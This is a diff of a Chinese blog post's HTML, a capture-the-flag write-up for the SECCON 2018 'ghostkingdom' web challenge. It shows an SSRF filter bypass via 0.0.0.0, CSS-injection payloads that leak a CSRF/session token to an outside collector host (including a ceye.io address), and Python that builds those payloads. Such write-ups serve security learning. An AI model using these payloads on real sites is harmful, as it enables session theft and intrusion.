@@ -57,7 +57,7 @@
     "datePublished": "2018-10-29 08:38:00 \x2b0000 UTC",
     "dateModified" : "2018-10-29 08:38:00 \x2b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2018\/10\/seccon-2018-web-ghostkingdom-shooter\/",
-    "wordCount" : "2248",
+    "wordCount" : "2243",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -145,292 +145,216 @@
           
           
 
-          
-
-<blockquote>
-<p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/3075" rel="nofollow noreferrer" target="_blank">https://xz.aliyun.com/t/3075</a></p>
+          <blockquote>
+<p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/3075">https://xz.aliyun.com/t/3075</a></p>
 </blockquote>
-
 <h2 id="ghostkingdom">ghostkingdom</h2>
-
 <p>SEECON 2018 唯一的一道 Web 题，不过确实挺好玩的。。</p>
-
-<p>首先打开题目链接：<a href="http://ghostkingdom.pwn.seccon.jp/FLAG/" rel="nofollow noreferrer" target="_blank">http://ghostkingdom.pwn.seccon.jp/FLAG/</a></p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230757-40a2ab7a-dac3-1.png" data-sizes="auto" alt="Hint" title="Hint" class="lazyload"><figcaption class="image-caption">Hint</figcaption></figure></p>
-
+<p>首先打开题目链接：http://ghostkingdom.pwn.seccon.jp/FLAG/</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230757-40a2ab7a-dac3-1.png" alt="Hint" title="Hint"></p>
 <p>很明显我们需要 getshell 或者是执行相应的 <code>ls /var/www/html/FLAG</code> 命令，列出目录下的文件</p>
-
 <p>然后我们继续往下看题目的功能，首先是最基本的 注册 / 登录：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230821-4f0b7f70-dac3-1.png" data-sizes="auto" alt="Register" title="Register" class="lazyload"><figcaption class="image-caption">Register</figcaption></figure></p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230836-581f2224-dac3-1.png" data-sizes="auto" alt="Login" title="Login" class="lazyload"><figcaption class="image-caption">Login</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230821-4f0b7f70-dac3-1.png" alt="Register" title="Register"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230836-581f2224-dac3-1.png" alt="Login" title="Login"></p>
 <p>进来之后是个很明显的菜单界面：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230852-618da344-dac3-1.png" data-sizes="auto" alt="Menu" title="Menu" class="lazyload"><figcaption class="image-caption">Menu</figcaption></figure></p>
-
-<p>功能如下：
-- Message to admin
-- Take a screenshot
-- Upload image(only localhost)</p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230852-618da344-dac3-1.png" alt="Menu" title="Menu"></p>
+<p>功能如下：</p>
+<ul>
+<li>Message to admin</li>
+<li>Take a screenshot</li>
+<li>Upload image(only localhost)</li>
+</ul>
 <p>然后我们来具体看每项功能：</p>
-
 <h3 id="message-to-admin">Message to admin</h3>
-
 <p>可以看到第一项功能是向管理员发送消息，我们可以构造两种消息： <code>Normal</code> 和 <code>Emergency</code>:</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230906-6a2a1eec-dac3-1.png" data-sizes="auto" alt="Message to Admin" title="Message to Admin" class="lazyload"><figcaption class="image-caption">Message to Admin</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230906-6a2a1eec-dac3-1.png" alt="Message to Admin" title="Message to Admin"></p>
 <p>但二种本质上是一样的，都是通过 URL 来传递相应参数，我们可以看到 <code>http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;msg=233&amp;action=msgadm2</code> 和对应的源代码：</p>
-
-<pre><code class="language-html">
-&lt;!DOCTYPE html
-	PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;
-	 &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;ja&quot; xml:lang=&quot;ja&quot;&gt;
-&lt;head&gt;
-&lt;title&gt;SECCON 2018&lt;/title&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
-&lt;/head&gt;
-&lt;body bgcolor=&quot;black&quot;&gt;
-&lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&gt;&lt;style&gt;h2{border:double #668ad8;border-width:6px 0 6px 0;padding:10px;color:#668ad8} .main{background-color:#e1e1e1;color:black;width:85%;padding:60px;margin:40px auto;border:2px solid #C6B665}.msg{padding:15px;border:1px solid black} .ok{color:blue} .warn{color:orange} .err{color:red} .green{background-color:lightgreen} .btn{background:#668ad8;color:white;padding:0.5em;margin:10px} .sshot{border:2px solid white}&lt;/style&gt;&lt;img src=&quot;seccon2018_logo.png&quot;&gt;&lt;div class=&quot;main&quot;&gt;&lt;form action=&quot;?&quot; method=&quot;get&quot;&gt;&lt;style&gt;span{background-color:red;color:yellow}&lt;/style&gt;
-&lt;span class=&quot;msg&quot;&gt;Message: 233&lt;/span&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;4b51b0980ba510e7f713da&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;msgadm3&quot;&gt;
-&lt;input type=&quot;submit&quot; class=&quot;btn&quot; value=&quot;Send to admin&quot;&gt;
-</code></pre>
-
-<p>很明显 <code>css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9</code> 对应的是字符串 <code>span{background-color:red;color:yellow}</code>，而 <code>msg=233</code> 对应 <code>Message: 233</code>。这里想直接进行 html 标签的注入，但很遗憾发现 <code>&lt;&gt;</code> 会被转义：</p>
-
-<pre><code class="language-html">&lt;form action=&quot;?&quot; method=&quot;get&quot;&gt;&lt;style&gt;&amp;lt;/sytle&amp;gt;
-&lt;/style&gt;
-&lt;span class=&quot;msg&quot;&gt;Message: &amp;lt;/span&amp;gt;&lt;/span&gt;
-</code></pre>
-
-<p>那么 xss 的注入点被限制到了很小的范围，我们仅能通过 <code>&lt;style&gt;span {background: url(xxx)}&lt;/style&gt;</code> 的方式发起特定的 GET 请求，虽然看上去用处不大，但会在后续的解题中使用。</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">
+<span style="color:#75715e">&lt;!DOCTYPE html
+</span><span style="color:#75715e">	PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;
+</span><span style="color:#75715e">	 &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;</span>
+&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ja&#34;</span> <span style="color:#a6e22e">xml:lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ja&#34;</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">title</span>&gt;SECCON 2018&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=UTF-8&#34;</span> /&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">bgcolor</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;black&#34;</span>&gt;
+<span style="color:#75715e">&lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&gt;</span>&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">h2</span>{<span style="color:#66d9ef">border</span>:<span style="color:#66d9ef">double</span> <span style="color:#ae81ff">#668ad8</span>;<span style="color:#66d9ef">border-width</span>:<span style="color:#ae81ff">6</span><span style="color:#66d9ef">px</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">6</span><span style="color:#66d9ef">px</span> <span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">10</span><span style="color:#66d9ef">px</span>;<span style="color:#66d9ef">color</span>:<span style="color:#ae81ff">#668ad8</span>} .<span style="color:#a6e22e">main</span>{<span style="color:#66d9ef">background-color</span>:<span style="color:#ae81ff">#e1e1e1</span>;<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">black</span>;<span style="color:#66d9ef">width</span>:<span style="color:#ae81ff">85</span><span style="color:#66d9ef">%</span>;<span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">60</span><span style="color:#66d9ef">px</span>;<span style="color:#66d9ef">margin</span>:<span style="color:#ae81ff">40</span><span style="color:#66d9ef">px</span> <span style="color:#66d9ef">auto</span>;<span style="color:#66d9ef">border</span>:<span style="color:#ae81ff">2</span><span style="color:#66d9ef">px</span> <span style="color:#66d9ef">solid</span> <span style="color:#ae81ff">#C6B665</span>}.<span style="color:#a6e22e">msg</span>{<span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">15</span><span style="color:#66d9ef">px</span>;<span style="color:#66d9ef">border</span>:<span style="color:#ae81ff">1</span><span style="color:#66d9ef">px</span> <span style="color:#66d9ef">solid</span> <span style="color:#66d9ef">black</span>} .<span style="color:#a6e22e">ok</span>{<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">blue</span>} .<span style="color:#a6e22e">warn</span>{<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">orange</span>} .<span style="color:#a6e22e">err</span>{<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">red</span>} .<span style="color:#a6e22e">green</span>{<span style="color:#66d9ef">background-color</span>:<span style="color:#66d9ef">lightgreen</span>} .<span style="color:#a6e22e">btn</span>{<span style="color:#66d9ef">background</span>:<span style="color:#ae81ff">#668ad8</span>;<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">white</span>;<span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">0.5</span><span style="color:#66d9ef">em</span>;<span style="color:#66d9ef">margin</span>:<span style="color:#ae81ff">10</span><span style="color:#66d9ef">px</span>} .<span style="color:#a6e22e">sshot</span>{<span style="color:#66d9ef">border</span>:<span style="color:#ae81ff">2</span><span style="color:#66d9ef">px</span> <span style="color:#66d9ef">solid</span> <span style="color:#66d9ef">white</span>}&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;seccon2018_logo.png&#34;</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">span</span>{<span style="color:#66d9ef">background-color</span>:<span style="color:#66d9ef">red</span>;<span style="color:#66d9ef">color</span>:<span style="color:#66d9ef">yellow</span>}&lt;/<span style="color:#f92672">style</span>&gt;
+&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;msg&#34;</span>&gt;Message: 233&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4b51b0980ba510e7f713da&#34;</span>&gt;
+&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;action&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;msgadm3&#34;</span>&gt;
+&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Send to admin&#34;</span>&gt;
+</code></pre></div><p>很明显 <code>css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9</code> 对应的是字符串 <code>span{background-color:red;color:yellow}</code>，而 <code>msg=233</code> 对应 <code>Message: 233</code>。这里想直接进行 html 标签的注入，但很遗憾发现 <code>&lt;&gt;</code> 会被转义：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&amp;</span><span style="color:#f92672">lt</span><span style="color:#f92672">;/</span><span style="color:#f92672">sytle</span><span style="color:#f92672">&amp;</span><span style="color:#f92672">gt</span><span style="color:#f92672">;</span>
+&lt;/<span style="color:#f92672">style</span>&gt;
+&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;msg&#34;</span>&gt;Message: &amp;lt;/span&amp;gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</code></pre></div><p>那么 xss 的注入点被限制到了很小的范围，我们仅能通过 <code>&lt;style&gt;span {background: url(xxx)}&lt;/style&gt;</code> 的方式发起特定的 GET 请求，虽然看上去用处不大，但会在后续的解题中使用。</p>
 <h3 id="take-a-screenshot">Take a screenshot</h3>
-
 <p>第二项功能比较简单，程序会去访问你指定的 URL 并将相应的结果返回：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230932-793363ee-dac3-1.png" data-sizes="auto" alt="SShot" title="Shot" class="lazyload"><figcaption class="image-caption">SShot</figcaption></figure></p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230944-80ce6590-dac3-1.png" data-sizes="auto" alt="SShot2" title="SShot2" class="lazyload"><figcaption class="image-caption">SShot2</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230932-793363ee-dac3-1.png" alt="SShot" title="Shot"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028230944-80ce6590-dac3-1.png" alt="SShot2" title="SShot2"></p>
 <p>很明显，这里存在着 SSRF，我们可以通过该操作触发服务端的访问，如通过访问 <code>http://localhost</code> 来查看从 localhost 端登录的效果，但这里存在着一个限制：</p>
-
 <pre><code>You can not use URLs that contain the following keywords: 127, ::1, local
-</code></pre>
-
-<p>绕过的方式有很多种，我用来 <code>http://0.0.0.0</code> 来绕过该限制：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231025-98e4a72a-dac3-1.png" data-sizes="auto" alt="Localhost" title="Localhost" class="lazyload"><figcaption class="image-caption">Localhost</figcaption></figure></p>
-
-<h2 id="xss-ssrf">XSS + SSRF</h2>
-
+</code></pre><p>绕过的方式有很多种，我用来 <code>http://0.0.0.0</code> 来绕过该限制：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231025-98e4a72a-dac3-1.png" alt="Localhost" title="Localhost"></p>
+<h2 id="xss--ssrf">XSS + SSRF</h2>
 <p>我们现在已知了本题存在的两个利用点：XSS 和 SSRF，下面需要思考的是利用这两个点来做什么文章。</p>
-
 <p>很明显，我们需要想办法让我们在题目环境外访问到 <em>Upload image</em> 这项功能，通过尝试之后发现通过 <code>X-Forwarded-For</code> 等 header 无效，也无法通过 SSRF 来间接访问，因为相应的回显仅仅是一张截图，无法进行任何操作。</p>
-
 <p>此时，我们关注到这么一个现象，即我们的 <code>Cookie: CGISESSID=405b0d4750c3371e26f519</code> 和 Preview 页面的 csrf token 一致，那么是不是等价于我们只要获得了相应的 csrf token，即可通过修改 cookie 的方式切换登录的状态。</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231040-a20ead14-dac3-1.png" data-sizes="auto" alt="csrf" title="csrf" class="lazyload"><figcaption class="image-caption">csrf</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231040-a20ead14-dac3-1.png" alt="csrf" title="csrf"></p>
 <p>此时想到了 Google CTF 一道题 cat chat 的思路，利用 css 选择器进行 xss，泄露出页面的敏感信息。在这里，我们需要泄露的敏感信息是 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;48cab678ef3b27b008e60d&quot;&gt;</code> 标签的 value 信息，所以我们可以这样来写 payload：</p>
-
-<pre><code class="language-css">input[value^=&quot;0&quot;] {background: url(http://server?csrf=0)}
-input[value^=&quot;1&quot;] {background: url(http://server?csrf=1)}
-input[value^=&quot;2&quot;] {background: url(http://server?csrf=2)}
-input[value^=&quot;3&quot;] {background: url(http://server?csrf=3)}
-input[value^=&quot;4&quot;] {background: url(http://server?csrf=4)}
-input[value^=&quot;5&quot;] {background: url(http://server?csrf=5)}
-input[value^=&quot;6&quot;] {background: url(http://server?csrf=6)}
-input[value^=&quot;7&quot;] {background: url(http://server?csrf=7)}
-input[value^=&quot;8&quot;] {background: url(http://server?csrf=8)}
-input[value^=&quot;9&quot;] {background: url(http://server?csrf=9)}
-input[value^=&quot;a&quot;] {background: url(http://server?csrf=a)}
-input[value^=&quot;b&quot;] {background: url(http://server?csrf=b)}
-input[value^=&quot;c&quot;] {background: url(http://server?csrf=c)}
-input[value^=&quot;d&quot;] {background: url(http://server?csrf=d)}
-input[value^=&quot;e&quot;] {background: url(http://server?csrf=e)}
-input[value^=&quot;f&quot;] {background: url(http://server?csrf=f)}
-</code></pre>
-
-<p>只要 value 的值和猜测中的一项成功匹配，我们即可从自己的服务器接收到相应数据，然后每次猜测 csrf token 的一位，共需猜解 22 位。但由于 Send to admin 功能是无效的，我们必须用第二部分介绍的 SSRF 触发 XSS 操作。</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231053-a9b924c2-dac3-1.png" data-sizes="auto" alt="token" title="token" class="lazyload"><figcaption class="image-caption">token</figcaption></figure></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-css" data-lang="css"><span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=0</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=1</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=2</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=3</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=4</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=5</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;6&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=6</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;7&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=7</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=8</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=9</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=a</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=b</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=c</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=d</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=e</span>)}
+<span style="color:#f92672">input</span><span style="color:#f92672">[</span><span style="color:#f92672">value</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">]</span> {<span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">http://server?csrf=f</span>)}
+</code></pre></div><p>只要 value 的值和猜测中的一项成功匹配，我们即可从自己的服务器接收到相应数据，然后每次猜测 csrf token 的一位，共需猜解 22 位。但由于 Send to admin 功能是无效的，我们必须用第二部分介绍的 SSRF 触发 XSS 操作。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231053-a9b924c2-dac3-1.png" alt="token" title="token"></p>
 <p>为了方便操作，可以利用 python 帮助我们构造 payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getBase64</span>(s):
+    z <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i  <span style="color:#f92672">in</span>  <span style="color:#e6db74">&#39;0123456789abcdef&#39;</span>:
+        st <span style="color:#f92672">=</span> s <span style="color:#f92672">+</span> i
+        z<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;input[value^=&#34;{}&#34;] {{background: url(http://server?csrf={})}}&#39;</span><span style="color:#f92672">.</span>format(st, st))
+    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(z))
 
-<pre><code class="language-python">def getBase64(s):
-    z = []
-    for i  in  '0123456789abcdef':
-        st = s + i
-        z.append('input[value^=&quot;{}&quot;] {{background: url(http://server?csrf={})}}'.format(st, st))
-    return base64.b64encode('\n'.join(z))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">formatURL</span>(s):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;http://0.0.0.0/?css={}&amp;action=msgadm2&#34;</span><span style="color:#f92672">.</span>format(s)
 
-def formatURL(s):
-    return &quot;http://0.0.0.0/?css={}&amp;action=msgadm2&quot;.format(s)
-
-formatURL(getBase64(''))
-</code></pre>
-
-<p>PS：不知道为什么我爆到前 14 位就会卡住，所以后 8 位可以从尾部开始匹配：</p>
-
-<pre><code class="language-python">def getBase64(s):
-    z = []
-    for i  in  &quot;0123456789abcdef&quot;:
-        st =   i+s
-        z.append('input[value$=&quot;{}&quot;] {{background: url(http://5ax2cw.ceye.io?csrf={})}}'.format(st, st))
-    return base64.b64encode('\n'.join(z))
-</code></pre>
-
-<p>操作过程如下：
-1. 通过 SSRF 访问 <a href="http://0.0.0.0/?user=密码&amp;pass=账号&amp;action=login" rel="nofollow noreferrer" target="_blank">http://0.0.0.0/?user=密码&amp;pass=账号&amp;action=login</a> 在服务端登录
-2. 通过 SSRF 访问 <a href="http://0.0.0.0/?css=payload&amp;action=msgadm2" rel="nofollow noreferrer" target="_blank">http://0.0.0.0/?css=payload&amp;action=msgadm2</a> 触发 XSS，逐个字节爆破你的 cookie</p>
-
+formatURL(getBase64(<span style="color:#e6db74">&#39;&#39;</span>))
+</code></pre></div><p>PS：不知道为什么我爆到前 14 位就会卡住，所以后 8 位可以从尾部开始匹配：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getBase64</span>(s):
+    z <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i  <span style="color:#f92672">in</span>  <span style="color:#e6db74">&#34;0123456789abcdef&#34;</span>:
+        st <span style="color:#f92672">=</span>   i<span style="color:#f92672">+</span>s
+        z<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;input[value$=&#34;{}&#34;] {{background: url(http://5ax2cw.ceye.io?csrf={})}}&#39;</span><span style="color:#f92672">.</span>format(st, st))
+    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(z))
+</code></pre></div><p>操作过程如下：</p>
+<ol>
+<li>通过 SSRF 访问 http://0.0.0.0/?user=密码&amp;pass=账号&amp;action=login 在服务端登录</li>
+<li>通过 SSRF 访问 http://0.0.0.0/?css=payload&amp;action=msgadm2 触发 XSS，逐个字节爆破你的 cookie</li>
+</ol>
 <p>（PS:之所以要先登录是因为你想要获得的是你在 localhost 状态下的 cookie，所以你必须在远端触发一次登录操作</p>
-
 <p>成功获得 cookie: <code>405b0d4750c3371e26f519</code></p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231121-baa0bbc4-dac3-1.png" data-sizes="auto" alt="Menu2" title="Menu2" class="lazyload"><figcaption class="image-caption">Menu2</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231121-baa0bbc4-dac3-1.png" alt="Menu2" title="Menu2"></p>
 <h2 id="ghostscript">GhostScript</h2>
-
 <p>现在我们终于可以上传图片了，首先任意上传一张错误的图片：</p>
-
